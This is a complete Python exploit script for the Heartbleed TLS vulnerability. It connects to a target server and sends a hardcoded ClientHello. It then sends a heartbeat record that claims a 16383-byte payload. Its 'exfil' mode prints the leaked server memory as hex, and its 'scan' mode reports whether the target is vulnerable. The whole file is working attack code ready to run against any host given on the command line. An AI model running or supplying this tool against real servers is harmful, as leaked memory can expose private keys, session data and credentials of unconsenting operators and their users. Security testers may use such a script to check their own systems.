#!/usr/bin/env python3

import socket
from optparse import OptionParser


def heartbleed(ip, port, mode, num_bytes):
    
    # Connect to the server
    print(f"Testing for vulnerability in {ip}:{port}...")
    target = (ip, port)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(target)
    print("Successfully established TCP connection.")
    
    # The client hello is the result of running scapy's 
    # TLSRecord(version="TLS_1_2")/TLSHandshake()/TLSClientHello(TLSExtension() / TLSExtHearbeat())
    # and then changing the first byte from \x17 to \x16
    # I don't know why scapy thinks the byte is \x17 but a TLS handshake uses
    # \x16. I'm just sending the raw bytes to avoid requiring that import.
    # scapy was acting up on my machine so why not avoid it?
    client_hello = b'\x16\x03\x01\x005\x01\x00\x001\x03\x03`?\xb4\x15\xecc\xba\xc7\xbc\x93\x10\\\n\x01\x89UQ\x16FdxL\xce\x13\x82\x18\x9e\xf5\xdfb\xecR\x00\x00\x02\x00/\x01\x00\x00\x06\x00\x0b\x00\x02\x01\x00'
    print("Sending TLS Client Hello.")
    s.send(client_hello)
    server_hello = s.recv(8192)
    if server_hello == b'':
        print("Something went wrong. The server didn't reply to the hello message.")
        return

    print("Received server hello. Sending heartbeat.")
    # The result of running scapy's 
    # TLSRecord(version="TLS_1_2")/TLSHeartBeat(length=2**14-1,data='bleed...')
    # Once again I include the raw bytes to avoid the import
    heartbeat = b'\x18\x03\x03\x00\x0b\x01?\xffbleed...'
    s.send(heartbeat)
    r = s.recv(2**14-1)
    if r == b'':
        print("Something went wrong. The server didn't reply to the heartbeat.")
        return
    if mode == 'scan':
        print("VULNERABLE") if len(r) >= num_bytes else print("SECURE")
    elif mode == 'exfil':
        if len(r) < num_bytes:
            print(f"Failed to extract {num_bytes} bytes.")
        else:
            print(r[:num_bytes].hex())
    

if __name__=="__main__":
    parser = OptionParser("usage: %prog [options]")
    parser.add_option("-m", "--mode", dest="mode",
                      default="scan", type="string",
                      help="specify if you'd prefer to 'scan' the target \
                      or 'exfil' data [default=scan]")
    parser.add_option("-p", "--port", dest="port", default=443,
                      type="int", help="port number to test [default=443]")
    parser.add_option("-s", "--server", dest="hostname", default='127.0.0.1',
                      type="string", help="IP address to target [default=127.0.0.1]")
    parser.add_option("-b", "--bytes", dest="num_bytes", default=2**14-1,
                      type=int, help="number of bytes to exfil [default=16383]")

    (options, args) = parser.parse_args()
    hostname = options.hostname
    port = options.port
    mode = options.mode
    num_bytes = options.num_bytes
    heartbleed(hostname,port,mode,num_bytes)
